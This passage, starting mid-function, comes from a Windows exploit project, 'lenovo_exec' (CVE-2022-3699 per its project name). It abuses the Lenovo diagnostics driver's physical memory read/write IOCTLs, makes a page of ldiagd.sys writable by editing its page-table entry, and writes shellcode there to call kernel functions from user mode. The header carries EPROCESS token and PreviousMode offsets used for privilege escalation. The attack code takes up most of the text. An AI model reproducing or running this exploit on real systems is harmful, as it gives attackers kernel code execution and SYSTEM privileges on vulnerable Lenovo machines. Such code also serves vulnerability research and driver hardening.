	thread_list_entry_offset = EzPdbGetStructPropertyOffset(&pdb, "_ETHREAD", L"ThreadListEntry");

	mi_get_pte_address_offset = EzPdbGetRva(&pdb, "MiGetPteAddress");

	EzPdbUnload(&pdb);

#endif

	PteBase = GetPteBase();

	const auto ldiagd_address = FindBase("ldiagd.sys");
	const auto address = ldiagd_address + 0x1200;

	PAGE_TABLE_ENTRY entry;
	const auto page_table_address = GetPageTableInfo(address, entry);

	entry.flags.ReadWrite = 1;

	WritePageTable(page_table_address, entry);

	UINT8 shellcode[] =
	{
		0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89,
		0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x40,
		0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44,
		0x24, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B,
		0x44, 0x24, 0x20, 0x4C, 0x8B, 0x48, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20,
		0x4C, 0x8B, 0x40, 0x18, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x50,
		0x10, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x48, 0x08, 0xFF, 0x54,
		0x24, 0x28, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0x49, 0x28, 0x48,
		0x89, 0x01, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC
	};

	for (int i = 0; i < sizeof(shellcode); i += 8)
	{
		WriteVirtData(address + i, reinterpret_cast<UINT64*>(reinterpret_cast<UINT64>(&shellcode) + i));
	}

    return TRUE;
}

BOOL LenovoMemoryMgr::Shutdown()
{
    CloseHandle(hDevice);
    return 0;
}
```

`lenovo_exec/LenovoMemoryMgr.h`:

```h
#pragma once

#include <Windows.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "ntdll")

//#define USE_STATIC_OFFSETS

#define IOCTL_PHYS_RD 0x222010
#define IOCTL_PHYS_WR 0x222014

#define SYS_INFO_CLASS_MODULE_INFO 0x0b
#define OFFSET_PS_INITIAL_SYSTEM_PROC 0x00cfb420
#define EPROCESS_TOKEN_OFFSET 0x358
#define EPROCESS_ACTIVE_LINKS_OFFSET 
#define EPROCESS_DIRBASE_OFFSET 0x028

struct CALL_DATA
{
	UINT64 FunctionAddr;
	UINT64 Arg1;
	UINT64 Arg2;
	UINT64 Arg3;
	UINT64 Arg4;
	UINT64 CallResult0;
};

typedef struct SYSTEM_MODULE {
	PVOID  Reserved1;
	PVOID  Reserved2;
	PVOID  ImageBase;
	ULONG  ImageSize;
	ULONG  Flags;
	USHORT Index;
	USHORT NameLength;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR   ImageName[256];
} SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct LDIAG_READ {
	DWORD64 data;
	DWORD64 wLen;
} LDIAG_READ, * PLDIAG_READ;

typedef struct LDIAG_WRITE {
	DWORD64 _where;
	DWORD dwMapSize;
	DWORD dwLo;
	DWORD64 _what_ptr;
} LDIAG_WRITE, * PLDIAG_WRITE;

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/typesndefs.h
typedef struct _FILL_PTE_HIERARCHY
{
	UINT64 PXE = 0;
	UINT64 PPE = 0;
	UINT64 PDE = 0;
	UINT64 PTE = 0;
} FILL_PTE_HIERARCHY, * PFILL_PTE_HIERARCHY;

// https://github.com/ch3rn0byl/CVE-2021-21551/blob/master/CVE-2021-21551/typesndefs.h#L54
typedef union _PAGE_TABLE_ENTRY
{
	struct
	{
		UINT64 Present : 1;					/// bit 0
		UINT64 ReadWrite : 1;				/// bit 1
		UINT64 UserSupervisor : 1;			/// bit 2
		UINT64 PageLevelWriteThrough : 1;	/// bit 3
		UINT64 PageLevelCacheDisable : 1;	/// bit 4
		UINT64 Accessed : 1;				/// bit 5
		UINT64 Dirty : 1;					/// bit 6
		UINT64 PAT : 1;						/// bit 7
		UINT64 Global : 1;					/// bit 8 
		UINT64 CopyOnWrite : 1;				/// bit 9
		UINT64 Ignored : 2;					/// bits 10 - 11
		UINT64 Pfn : 40;					/// bits 12 - (52 - 1)
		UINT64 Reserved : 11;				/// bits 52 - 62
		UINT64 NxE : 1;						/// bit 63
	} flags;
	UINT64 value = 0;
} PAGE_TABLE_ENTRY, * PPAGE_TABLE_ENTRY;

enum PageType 
{
	UsePte,
	UsePde
};

#ifdef USE_STATIC_OFFSETS

#define OFFSET_EPROCESS_LINKS 0x448
#define OFFSET_EPROCESS_PID 0x440
#define OFFSET_EPROCESS_THREAD_HEAD_LIST 0x5E0

#define OFFSET_ETHREAD_ID 0x480
#define OFFSET_ETHREAD_PREVIOUS_MODE 0x232
#define OFFSET_ETHREAD_LIST_ENTRY 0x4E8

#define OFFSET_MI_GET_PTE_ADDRESS 0x2DDF70

#endif

class LenovoMemoryMgr
{
public:
	LenovoMemoryMgr() {};
	~LenovoMemoryMgr() {};

	HANDLE hDevice = 0;
	UINT64 physSwapAddr = 0;
	UINT64 tempSwap = 0;
	UINT64 NtosBase = 0;
	UINT64 PteBase = 0;

	ULONG process_active_process_links_offset = 0;
	ULONG process_pid_offset = 0;
	ULONG process_thread_head_list_offset = 0;

	ULONG thread_id_offset = 0;
	ULONG thread_previous_mode_offset = 0;
	ULONG thread_list_entry_offset = 0;

	ULONG mi_get_pte_address_offset = 0;

	UINT64 FindBase(const char* image_name);

	UINT64 GetPsInitialSystemProc();
	UINT64 GetKernelExport(const char* function_name);
	BOOL SearchEprocessLinksForPid(UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess);

	UINT64 GetPreviousModeAddress();
	UINT64 GetPageTableInfo(UINT64 address, PAGE_TABLE_ENTRY& entry);
	BOOL WritePageTable(UINT64 page_table_address, PAGE_TABLE_ENTRY entry);
	
	BOOL Init();
	BOOL Shutdown();

	const char* strDeviceName = R"(\\.\LenovoDiagnosticsDriver)";

	UINT64 CallKernelFunction(_In_ UINT64 address, UINT64 arg1, UINT64 arg2, UINT64 arg3, UINT64 arg4);
	
	template <typename T>
	requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
	BOOL ReadPhysData(_In_ UINT64 address, _Out_ T* data);

	template <typename T>
	requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
	BOOL WritePhysData(_In_ UINT64 PhysDest, _In_ T* data);

	template <typename T>
	requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
	BOOL ReadVirtData(_In_ UINT64 address, _Out_ T* data);

	template <typename T>
	requires(sizeof(T) == 1 || sizeof(T) == 2 || sizeof(T) == 4 || sizeof(T) == 8)
	BOOL WriteVirtData(_In_ UINT64 address, _Out_ T* data);

private:
	PFILL_PTE_HIERARCHY CreatePteHierarchy(UINT64 VirtualAddress);
	UINT64 FindPhysSwapSpace();
	UINT64 GetPteBase();
	UINT64 VtoP(UINT64 va, UINT64 index, PageType p);
	PageType GetPageTypeForVirtualAddress(UINT64 VirtAddress, PPAGE_TABLE_ENTRY PageTableEntry);
	UINT64 FindNtosBase();
};


```

`lenovo_exec/lenovo_exec.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{bf4447b0-1f74-4375-b7a7-187f9f86e868}</ProjectGuid>
    <RootNamespace>CVE20223699</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>lenovo_exec</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>$(SolutionDir)output\build\</OutDir>
    <IntDir>$(SolutionDir)output\intermediates\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpplatest</LanguageStandard>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="EzPdb.cpp" />
    <ClCompile Include="LenovoMemoryMgr.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="md5.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="EzPdb.h" />
    <ClInclude Include="LenovoMemoryMgr.h" />
    <ClInclude Include="md5.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`lenovo_exec/lenovo_exec.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <ClCompile Include="LenovoMemoryMgr.cpp" />
    <ClCompile Include="main.cpp" />
    <ClCompile Include="md5.cpp" />
    <ClCompile Include="EzPdb.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="LenovoMemoryMgr.h" />
    <ClInclude Include="md5.h" />
    <ClInclude Include="EzPdb.h" />
  </ItemGroup>
</Project>
```

`lenovo_exec/lenovo_exec.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <ShowAllFiles>true</ShowAllFiles>
  </PropertyGroup>
</Project>
```

`lenovo_exec/main.cpp`:

```cpp
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <conio.h>
#include "LenovoMemoryMgr.h"

int main() 
{
	LenovoMemoryMgr lm = LenovoMemoryMgr();
	
	BOOL hasInit = lm.Init();
	
	if (!hasInit) 
	{
		return -1;
	}

	const auto ex_allocate_pool = lm.GetKernelExport("ExAllocatePoolWithTag");
	const auto pool = lm.CallKernelFunction(ex_allocate_pool, 0x0, 0x1000, 0x1337, 0);

	std::cout << std::hex << pool << std::endl;
	
	lm.Shutdown();
	
	return 0;
}

```

`lenovo_exec/md5.cpp`:

```cpp
#include "md5.h"

// https://github.com/pod32g/MD5/blob/master/md5.c

// Constants are the integer part of the sines of integers (in radians) * 2^32.
const UINT32 k[64] = {
0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee ,
0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501 ,
0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be ,
0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821 ,
0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa ,
0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8 ,
0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed ,
0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a ,
0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c ,
0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70 ,
0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05 ,
0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665 ,
0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039 ,
0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1 ,
0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1 ,
0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391 };

// r specifies the per-round shift amounts
const UINT32 r[] = { 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
					  5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20, 5,  9, 14, 20,
					  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
					  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21 };

// leftrotate function definition
#define LEFTROTATE(x, c) (((x) << (c)) | ((x) >> (32 - (c))))

void to_bytes(UINT32 val, UINT8 *bytes)
{
	bytes[0] = (UINT8)val;
	bytes[1] = (UINT8)(val >> 8);
	bytes[2] = (UINT8)(val >> 16);
	bytes[3] = (UINT8)(val >> 24);
}

UINT32 to_int32(const UINT8 *bytes)
{
	return (UINT32)bytes[0]
		| ((UINT32)bytes[1] << 8)
		| ((UINT32)bytes[2] << 16)
		| ((UINT32)bytes[3] << 24);
}

void md5(const UINT8 *initial_msg, UINT32 initial_len, UINT8 *digest) {

	// These vars will contain the hash
	UINT32 h0, h1, h2, h3;

	// Message (to prepare)
	UINT8 *msg = NULL;

	UINT32 new_len, offset;
	UINT32 w[16];
	UINT32 a, b, c, d, i, f, g, temp;

	// Initialize variables - simple count in nibbles:
	h0 = 0x67452301;
	h1 = 0xefcdab89;
	h2 = 0x98badcfe;
	h3 = 0x10325476;

	//Pre-processing:
	//append "1" bit to message    
	//append "0" bits until message length in bits Ёд 448 (mod 512)
	//append length mod (2^64) to message

	for (new_len = initial_len + 1; new_len % (512 / 8) != 448 / 8; new_len++)
		;

#ifdef _KERNEL_MODE
	msg = (UINT8*)ExAllocatePoolWithTag(PagedPool, new_len + 8, POOLTAG);
#else
	msg = (UINT8*)malloc(new_len + 8);
#endif

	memcpy(msg, initial_msg, initial_len);
	msg[initial_len] = 0x80; // append the "1" bit; most significant bit is "first"
	for (offset = initial_len + 1; offset < new_len; offset++)
		msg[offset] = 0; // append "0" bits

	// append the len in bits at the end of the buffer.
	to_bytes(initial_len * 8, msg + new_len);
	// initial_len>>29 == initial_len*8>>32, but avoids overflow.
	to_bytes(initial_len >> 29, msg + new_len + 4);

	// Process the message in successive 512-bit chunks:
	//for each 512-bit chunk of message:
	for (offset = 0; offset < new_len; offset += (512 / 8)) {

		// break chunk into sixteen 32-bit words w[j], 0 Ём j Ём 15
		for (i = 0; i < 16; i++)
			w[i] = to_int32(msg + offset + i * 4);

		// Initialize hash value for this chunk:
		a = h0;
		b = h1;
		c = h2;
		d = h3;

		// Main loop:
		for (i = 0; i < 64; i++) {

			if (i < 16) {
				f = (b & c) | ((~b) & d);
				g = i;
			}
			else if (i < 32) {
				f = (d & b) | ((~d) & c);
				g = (5 * i + 1) % 16;
			}
			else if (i < 48) {
				f = b ^ c ^ d;
				g = (3 * i + 5) % 16;
			}
			else {
				f = c ^ (b | (~d));
				g = (7 * i) % 16;
			}

			temp = d;
			d = c;
			c = b;
			b = b + LEFTROTATE((a + f + k[i] + w[g]), r[i]);
			a = temp;

		}

		// Add this chunk's hash to result so far:
		h0 += a;
		h1 += b;
		h2 += c;
		h3 += d;

	}

	// cleanup
#ifdef _KERNEL_MODE
	ExFreePoolWithTag(msg, POOLTAG);
#else
	free(msg);
#endif


	//var char digest[16] := h0 append h1 append h2 append h3 //(Output is in little-endian)
	to_bytes(h0, digest);
	to_bytes(h1, digest + 4);
	to_bytes(h2, digest + 8);
	to_bytes(h3, digest + 12);
}


std::string Md5(PVOID buffer, ULONG bufferLen)
{
	UINT8 raw[16];
	std::string res;

	md5((const UINT8*)buffer, bufferLen, raw);

	for (size_t i = 0; i < 16; i++)
	{
		char ch[4] = { 0 };
		sprintf(ch, "%02x", raw[i]);
		res += ch;
	}

	return res;
}

```

`lenovo_exec/md5.h`:

```h
#pragma once

// swprintf
#pragma warning (disable : 4996)

#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <string>

std::string Md5(PVOID buffer, ULONG bufferLen);
```